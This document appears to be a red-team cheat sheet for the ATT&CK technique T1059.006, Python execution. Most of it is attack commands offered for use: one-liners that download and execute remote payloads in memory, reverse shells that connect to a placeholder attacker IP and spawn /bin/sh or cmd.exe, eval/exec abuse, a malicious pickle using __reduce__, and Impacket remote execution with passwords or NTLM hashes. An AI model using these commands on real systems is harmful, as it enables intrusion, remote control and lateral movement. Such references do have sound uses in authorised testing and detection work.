# T1059.006 - Python (tooling)

Related ATT&CK context: remote code execution, reverse shell, deserialization,
and Impacket examples also overlap with remote services, WMI, scheduled tasks,
Unix shell, ingress tool transfer, and protocol tunneling.

Note: Python may not be installed by default. On Windows, use `py -3` (Python launcher) if `python3` is not in PATH.

## Direct execution

```bash
# Linux/macOS
python3 -c "print('hello')"

# Windows (Python launcher)
py -3 -c "print('hello')"

# Python 2 fallback (legacy systems)
python -c "print 'hello'"

# Execute script file
python3 /path/to/script.py

# Interactive mode (stdin)
echo "print('hello')" | python3
```

## Remote code execution via built-in urllib

```bash
# Download and exec in memory (Linux/macOS)
python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://<host>/payload.py").read())'

# Download and exec in memory (Windows)
py -3 -c "import urllib.request; exec(urllib.request.urlopen('http://<host>/payload.py').read())"

# Download to file then execute
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<host>/payload.py', '/tmp/p.py'); exec(open('/tmp/p.py').read())"
```

## Reverse shell

```python
# Unix (/bin/sh)
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('<ATTACKER_IP>',<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# Windows (cmd.exe)
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('<ATTACKER_IP>',<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"

# Using pty module (interactive tty, Unix only)
python3 -c "import pty,socket,os;s=socket.socket();s.connect(('<ATTACKER_IP>',<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
```

## eval / exec abuse

```bash
# eval with __import__
python3 -c "eval(\"__import__('os').system('whoami')\")"

# exec with multi-statement
python3 -c "exec(\"import os\\nos.system('whoami')\")"
```

## Pickle deserialization (arbitrary code execution via __reduce__)

```bash
# Generate malicious pickle file
python3 << 'EOF'
import pickle, os
class Pwn(object):
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dump(Pwn(), open('/tmp/pwn.pkl', 'wb'))
EOF

# On target: load the pickle (triggers os.system('whoami'))
python3 -c "import pickle; pickle.load(open('/tmp/pwn.pkl','rb'))"
```

## Impacket (Python remote execution toolkit)

```bash
# WMI exec (runs as authenticated user, no service created)
impacket-wmiexec domain/user:password@<target>
impacket-wmiexec domain/user@<target> -hashes :<ntlm_hash>

# SMB exec (creates service per command, runs as SYSTEM)
impacket-smbexec domain/user:password@<target>
impacket-smbexec domain/user@<target> -hashes :<ntlm_hash>

# PsExec (service creation, named pipe I/O, runs as SYSTEM)
impacket-psexec domain/user:password@<target>

# Task Scheduler exec
impacket-atexec domain/user:password@<target> whoami
```

```bash
python setup.py py2exe
```
